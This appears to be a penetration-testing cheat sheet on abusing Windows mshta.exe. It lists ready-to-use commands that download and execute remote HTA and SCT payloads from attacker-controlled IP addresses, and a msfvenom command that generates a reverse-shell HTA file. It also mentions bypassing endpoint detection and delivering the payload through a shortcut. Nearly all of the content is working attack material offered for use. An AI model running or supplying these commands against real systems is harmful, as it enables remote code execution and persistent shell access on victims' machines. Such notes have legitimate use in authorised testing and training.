## Mshta

```
# Execute from Web Server
# Note that mshta.exe will download the .hta file before its execution, so we must still bypass any installed endpoint detection software.
c:\Windows\System32\mshta.exe http://192.168.45.230:7711/test.hta

# Execute locally
c:\Windows\System32\mshta.exe c:\windows\temp\test.hta

# Download and execute sct file
c:\Windows\System32\mshta.exe vbscript:Close(Execute("GetObject(""script:http://10.10.10.100/test.sct"")"))

# msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f hta-psh -o shell.hta
```

## Binary File Paths
```
C:\Windows\System32\mshta.exe
C:\Windows\SysWOW64\mshta.exe
```

## Shortcut Delivery
Can also be delivered as a shortcut to the target

![image](https://github.com/user-attachments/assets/1fb2a35e-4181-4f83-9f54-464c2a395b22)


## Resources

- https://github.com/karemfaisal/SMUC/blob/master/MSHTA/Mshta.md
